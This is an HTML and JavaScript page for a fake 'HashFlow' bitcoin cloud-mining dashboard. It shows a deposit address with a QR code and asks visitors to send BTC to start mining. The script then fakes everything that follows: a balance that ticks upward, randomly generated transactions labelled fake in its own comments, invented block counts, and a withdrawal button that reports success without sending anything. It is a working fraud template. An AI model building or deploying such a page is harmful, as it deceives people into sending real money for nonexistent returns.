<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HashFlow BTC Mining Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;text-align:center;}
.card{max-width:95%;margin:15px auto;padding:20px;border-radius:12px;background:#131a2e;box-shadow:0 0 15px rgba(0,0,0,0.5);}
h2{color:#f2a900;margin-bottom:10px;}
.btc{font-size:28px;margin:12px 0;word-break:break-all;}
.stats-box{display:flex;justify-content:space-around;flex-wrap:wrap;margin-top:10px;}
.stats-box div{background:#0b0f1a;padding:10px 15px;border-radius:8px;margin:5px;flex:1;min-width:100px;}
canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;margin-top:15px;display:block;}
.tx-container{max-height:250px;overflow:hidden;margin-top:10px;border-radius:6px;background:#0b0f1a;padding:10px;text-align:left;font-size:13px;line-height:1.5;}
.tx-entry{display:flex;justify-content:space-between;padding:4px 6px;border-bottom:1px solid #222;}
.green{color:#00ff99;}
.yellow{color:#ffff66;}
.btc-box{background:#0b0f1a;padding:10px;border-radius:6px;word-break:break-all;margin:10px 0;font-size:14px;}
input{width:100%;padding:10px;margin:10px 0;border-radius:6px;border:none;font-size:14px;}
button{padding:10px 18px;margin:10px 5px;background:#f2a900;border:none;color:black;font-weight:bold;border-radius:6px;cursor:pointer;}
.progress-container{width:100%;background:#222;border-radius:8px;margin-top:15px;height:20px;}
.progress-bar{height:20px;background:#f2a900;width:0%;border-radius:8px;}
</style>
</head>
<body>

<!-- BTC Deposit -->
<div class="card">
<h2>Send BTC to Start Mining</h2>
<div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
<button onclick="copyAddress()">Copy Address</button>
<div>
<img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" alt="BTC QR Code">
</div>
</div>

<!-- Mining Dashboard -->
<div class="card">
<h2>Mining Dashboard</h2>
<p>Status: <span class="green">ACTIVE</span></p>
<div class="btc" id="btc">0.00000000 BTC</div>
<div class="stats-box">
<div>Hashrate: <span id="hashrate">120 TH/s</span></div>
<div>Blocks: <span id="blocks">0</span></div>
<div>Uptime: <span id="uptime">0h 0m</span></div>
</div>
<div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
<canvas id="chart"></canvas>
</div>

<!-- Withdraw -->
<div class="card">
<h2>Withdraw BTC</h2>
<p>Enter your BTC withdrawal address:</p>
<input type="text" id="withdrawAddress" placeholder="Enter BTC address">
<br>
<button onclick="withdrawBTC()">Withdraw</button>
<p id="withdrawMessage" style="color:#f2a900;font-size:14px;"></p>
</div>

<!-- Recent Activity -->
<div class="card">
<h2>Recent Activity</h2>
<div class="tx-container" id="txContainer"></div>
</div>

<script>
// Copy BTC address
function copyAddress(){
  navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
    .then(()=>{alert('BTC address copied!');});
}

// BTC Setup
const address="bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav";
let balance=0;
let pendingBalance=0;
let txContainer=document.getElementById("txContainer");
let paused=false;

// Mining simulation
let rate=0.0000001;

// Add fake transactions continuously
function addFakeTx(){
  const div=document.createElement("div");
  div.className="tx-entry";
  const value=(Math.random()*0.0005+0.00001).toFixed(8);
  const status=Math.random()<0.7?"Completed":"Pending";
  div.innerHTML=`<span>+${value} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
  txContainer.prepend(div);
  if(txContainer.childNodes.length>1000) txContainer.removeChild(txContainer.lastChild);
}
setInterval(addFakeTx,1500);

// BTC balance animation
function simulateMining(){
  if(paused) return;
  let add=rate;
  if(pendingBalance>0) add*=0.3;
  balance+=add;
  document.getElementById("btc").innerText=balance.toFixed(8)+" BTC";
}
setInterval(simulateMining,1000);

// Progress bar
let progress=0;
function animateProgress(){
  progress+=0.5; if(progress>100) progress=0;
  document.getElementById("progressBar").style.width=progress+"%";
}
setInterval(animateProgress,500);

// Smooth BTC chart
const canvas=document.getElementById("chart"); const ctx=canvas.getContext("2d");
let points=[0];
function drawChart(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  const w=canvas.width/50;
  let lastY=canvas.height - points[points.length-1]*canvas.height/0.01;
  ctx.beginPath(); ctx.moveTo(0,lastY);
  for(let i=1;i<points.length;i++){
    const y=canvas.height - points[i]*canvas.height/0.01;
    ctx.lineTo(i*w,y);
  }
  ctx.strokeStyle="#f2a900"; ctx.lineWidth=2; ctx.stroke();
  const last=points[points.length-1]||0;
  points.push(last+rate);
  if(points.length>50) points.shift();
}
setInterval(drawChart,500);

// Blocks & uptime
let blocks=0,minutes=0;
function updateStats(){
  blocks+=Math.floor(Math.random()*2);
  minutes++;
  let hours=Math.floor(minutes/60);
  let mins=minutes%60;
  document.getElementById("blocks").innerText=blocks;
  document.getElementById("uptime").innerText=`${hours}h ${mins}m`;
}
setInterval(updateStats,60000);

// Withdraw
function withdrawBTC(){
  const addr=document.getElementById("withdrawAddress").value.trim();
  if(addr===""){alert("Enter BTC address."); return;}
  document.getElementById("withdrawMessage").innerText=`Withdrawal to ${addr} processing...`;
  setTimeout(()=>{document.getElementById("withdrawMessage").innerText=`Withdrawal to ${addr} completed!`; document.getElementById("withdrawAddress").value="";},3000);
}

// 15-min pause
function startPauseCycle(){ setInterval(()=>{ paused=true; setTimeout(()=>{paused=false;},60000); },15*60*1000); }
startPauseCycle();

// 1-hour drop
function startHourlyDrop(){ setInterval(()=>{ balance*=0.995; },60*60*1000); }
startHourlyDrop();
</script>
</body>
</html>
